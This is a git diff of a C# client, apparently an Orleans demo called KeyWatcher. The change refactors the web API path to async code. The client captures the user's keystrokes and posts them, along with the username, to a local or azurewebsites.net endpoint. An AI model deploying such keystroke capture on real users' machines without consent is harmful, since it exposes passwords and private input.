@@ -5,7 +5,6 @@ using Orleans;
 using Orleans.Runtime;
 using Orleans.Runtime.Configuration;
 using System;
-using System.Collections.Generic;
 using System.Linq;
 using System.Net.Http;
 using System.Text;
@@ -21,8 +20,9 @@ namespace KeyWatcher.Orleans.Client
 		private const string LocalUri = "http://localhost:2554/api/keywatcher";
 		private const string AzureUri = "http://keywatcher.azurewebsites.net/api/keywatcher";
 
-		public static async Task Main(string[] args) => 
-			await Program.UseOrleansLocallyAsync();
+		public static async Task Main(string[] args) =>
+			//await Program.UseOrleansLocallyAsync();
+			await Program.UseOrleansViaWebApiAsync(Program.LocalUri);
 
 		private static async Task UseOrleansLocallyAsync()
 		{
@@ -48,20 +48,20 @@ namespace KeyWatcher.Orleans.Client
 			keyLogger.Listen();
 		}
 
-		private static void UseOrleansViaWebApi(string url)
+		private static async Task UseOrleansViaWebApiAsync(string url)
 		{
-			Console.Out.WriteLine("Begin...");
+			await Console.Out.WriteLineAsync("Begin...");
 			var userName = Program.GetUserName();
+			var client = new HttpClient();
 
 			var keyLogger = new BufferedEventedKeyWatcher(Program.BufferSize);
-			keyLogger.KeysLogged += (s, e) =>
+			keyLogger.KeysLogged += async (s, e) =>
 			{
 				var message = JsonConvert.SerializeObject(
 					new UserKeysMessage(userName, e.Keys.ToArray()), Formatting.Indented);
 				var content = new StringContent(message,
 					Encoding.Unicode, "application/json");
-				var postResponse = new HttpClient().PostAsync(url, content);
-				postResponse.Wait();
+				await client.PostAsync(url, content);
 			};
 
 
